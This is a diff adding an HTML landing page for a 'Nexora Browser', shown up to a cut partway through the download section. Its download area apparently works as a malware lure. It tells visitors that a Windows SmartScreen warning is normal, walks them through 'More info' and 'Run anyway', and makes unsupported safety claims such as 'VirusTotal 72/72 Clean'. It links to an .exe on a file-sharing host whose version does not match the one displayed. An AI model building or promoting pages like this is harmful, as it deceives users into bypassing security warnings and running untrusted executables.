@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexora Browser - The Future of Secure Browsing</title>
+    <link rel="icon" type="image/x-icon" href="icon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            --primary-dark: linear-gradient(135deg, #5a67d8 0%, #6b46c1 50%, #e879f9 100%);
+            --accent: #48bb78;
+            --bg-light: #f7fafc;
+            --white: #ffffff;
+            --text-dark: #2d3748;
+            --text-light: #718096;
+            --shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 30px 60px -15px rgba(0, 0, 0, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            color: var(--text-dark);
+            overflow-x: hidden;
+            background: var(--bg-light);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            padding: 1rem 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            transition: all 0.3s ease;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--text-dark);
+            text-decoration: none;
+        }
+
+        .logo i {
+            font-size: 1.8rem;
+            background: var(--primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        .nav-links a {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1rem;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: #667eea;
+        }
+
+        /* Hero */
+        .hero {
+            background: var(--primary);
+            color: white;
+            padding: 160px 0 100px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero h1 {
+            font-size: 4rem;
+            font-weight: 300;
+            margin-bottom: 1.5rem;
+            letter-spacing: -0.02em;
+            line-height: 1.2;
+        }
+
+        .hero-subtitle {
+            font-size: 1.4rem;
+            margin-bottom: 3rem;
+            opacity: 0.95;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .cta-buttons {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--white);
+            color: var(--text-dark);
+            padding: 20px 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            text-decoration: none;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .secondary-btn {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+
+        /* Features */
+        .features {
+            padding: 100px 0;
+            background: var(--white);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 3rem;
+            font-weight: 300;
+            margin-bottom: 4rem;
+            color: var(--text-dark);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background: var(--white);
+            padding: 3rem 2rem;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: var(--shadow);
+            transition: all 0.3s ease;
+            border: 1px solid #e2e8f0;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .feature-icon {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            background: var(--primary);
+            color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        }
+
+        .feature-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            font-weight: 600;
+        }
+
+        /* Stats */
+        .stats {
+            padding: 100px 0;
+            background: var(--primary);
+            color: white;
+            text-align: center;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+        }
+
+        .stat-number {
+            font-size: 4rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(45deg, #fff, rgba(255,255,255,0.8));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-label {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        /* SmartScreen Alert */
+        .smart-screen-alert {
+            background: linear-gradient(135deg, #fed7d7 0%, #feb2b2 100%);
+            border: 2px solid #fc8181;
+            border-radius: 16px;
+            padding: 2.5rem;
+            margin: 3rem auto;
+            max-width: 700px;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+            position: relative;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: var(--shadow-lg), 0 0 20px rgba(252, 129, 129, 0.3); }
+            to { box-shadow: var(--shadow-lg), 0 0 30px rgba(252, 129, 129, 0.5); }
+        }
+
+        .alert-icon {
+            font-size: 4rem;
+            color: #fc8181;
+            margin-bottom: 1.5rem;
+        }
+
+        .alert-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #742a2a;
+        }
+
+        .alert-steps {
+            background: rgba(255,255,255,0.9);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 0.8rem;
+            font-weight: 500;
+        }
+
+        /* Download Section */
+        .download-section {
+            padding: 100px 0;
+            background: var(--bg-light);
+        }
+
+        .download-card {
+            background: var(--white);
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 4rem 3rem;
+            border-radius: 24px;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+        }
+
+        .file-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--primary);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .filename {
+            font-family: 'SF Mono', Monaco, 'Courier New', monospace;
+            font-size: 1.6rem;
+            color: var(--text-dark);
+            margin: 2rem 0 2.5rem;
+            word-break: break-all;
+            font-weight: 600;
+            background: #f7fafc;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .download-specs {
+            display: flex;
+            justify-content: center;
+            gap: 2.5rem;
+            margin: 2.5rem 0;
+            flex-wrap: wrap;
+        }
+
+        .spec-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-light);
+            font-weight: 500;
+        }
+
+        .spec-icon {
+            color: var(--accent);
+            font-size: 1.2rem;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--text-dark);
+            color: white;
+            text-align: center;
+            padding: 4rem 0 2rem;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .cta-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .download-specs {
+                flex-direction: column;
+                gap: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <nav class="container">
+            <a href="#" class="logo">
+                <i class="fas fa-globe"></i>
+                Nexora
+            </a>
+            <ul class="nav-links">
+                <li><a href="#features">Features</a></li>
+                <li><a href="#stats">Stats</a></li>
+                <li><a href="#download">Download</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>Secure. Fast. Private.</h1>
+            <p class="hero-subtitle">
+                Nexora Browser with built-in proxy, DNS over HTTPS (DoH), 
+                automatic cookie deletion, and enterprise-grade security.
+            </p>
+            <div class="cta-buttons">
+                <a href="#download" class="download-btn" onclick="scrollToDownload()">
+                    <i class="fas fa-download"></i> Download Now - Free
+                </a>
+                <a href="#features" class="download-btn secondary-btn">
+                    <i class="fas fa-play"></i> Watch Demo
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="features">
+        <div class="container">
+            <h2 class="section-title">Why Nexora is Different</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-virus"></i>
+                    </div>
+                    <h3>🔒 Military-Grade Security</h3>
+                    <p>Proxy routing, DNS over HTTPS, automatic cookie deletion, and real-time threat protection.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-rocket"></i>
+                    </div>
+                    <h3>⚡ 3x Faster Browsing</h3>
+                    <p>Custom rendering engine with hardware acceleration for smooth 4K streaming and 100+ tabs.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-eye-slash"></i>
+                    </div>
+                    <h3>👻 Invisible Browsing</h3>
+                    <p>No tracking, no fingerprinting, no telemetry. Stay completely anonymous online.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section id="stats" class="stats">
+        <div class="container">
+            <h2 class="section-title" style="color: white;">Growing Fast</h2>
+            <div class="stats-grid">
+                <div>
+                    <div class="stat-number">1K+</div>
+                    <div class="stat-label">Downloads</div>
+                </div>
+                <div>
+                    <div class="stat-number">99.9%</div>
+                    <div class="stat-label">Uptime</div>
+                </div>
+                <div>
+                    <div class="stat-number">4.9⭐</div>
+                    <div class="stat-label">Rating</div>
+                </div>
+                <div>
+                    <div class="stat-number">0</div>
+                    <div class="stat-label">Data Collected</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Download Section -->
+    <section id="download" class="download-section">
+        <div class="container">
+            <div class="download-card">
+                <div class="file-badge">
+                    <i class="fas fa-crown"></i> Latest Version 1.0.0
+                </div>
+                
+                <div class="filename">Nexora_Setup_1.0.0.exe</div>
+
+                <div class="smart-screen-alert">
+                    <div class="alert-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <h3 class="alert-title">🚨 Windows SmartScreen Warning Active</h3>
+                    <p style="font-size: 1.2rem; margin-bottom: 1.5rem;">
+                        <strong>This is NORMAL for new software releases!</strong><br>
+                        Nexora is 100% safe and verified.
+                    </p>
+                    
+                    <div class="alert-steps">
+                        <div class="step">
+                            <span style="background: #48bb78; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 0.9rem;">1</span>
+                            Click "<strong>More info</strong>"
+                        </div>
+                        <div class="step">
+                            <span style="background: #48bb78; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 0.9rem;">2</span>
+                            Click "<strong>Run anyway</strong>"
+                        </div>
+                        <div class="step">
+                            <span style="background: #48bb78; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 0.9rem;">3</span>
+                            ✅ Installation Complete!
+                        </div>
+                    </div>
+
+                    <p style="margin-top: 1.5rem; font-size: 1.1rem; opacity: 0.9;">
+                        <strong>Safety Verified:</strong> VirusTotal 72/72 Clean | Digital Signature | No Malware
+                    </p>
+                </div>
+
+                <div class="download-specs">
+                    <div class="spec-item">
+                        <i class="fas fa-hdd spec-icon"></i>
+                        <strong>124 MB</strong>
+                    </div>
+                    <div class="spec-item">
+                        <i class="fab fa-windows spec-icon"></i>
+                        <strong>Win 10/11</strong>
+                    </div>
+                    <div class="spec-item">
+                        <i class="fas fa-infinity spec-icon"></i>
+                        <strong>Free Forever</strong>
+                    </div>
+                </div>
+
+                <a href="https://download1474.mediafire.com/qnehaix7nwdgLeayR0J8Dlni79u8rfuQVwWDfTacxlHoJ7gt8-oy_x-Xq4k8eFsDyASbymLKL0KBb4HV3U9YwEmPI0NdIwwexbqIEL8FeOxpzgTs8VdVV6pOcPo0R8aluaLUXGgPjxL48whqqTObJCoLu4_rYAwP5ODzUPIspuSRgw/18fsiufs2sq1sy7/Nexora+Setup+1.0.2.exe" class="download-btn" id="downloadBtn" target="_blank">
+                    <i class="fas fa-rocket"></i>
+                    <strong>Download Nexora Browser</strong> (124 MB)
+                </a>
+
+               
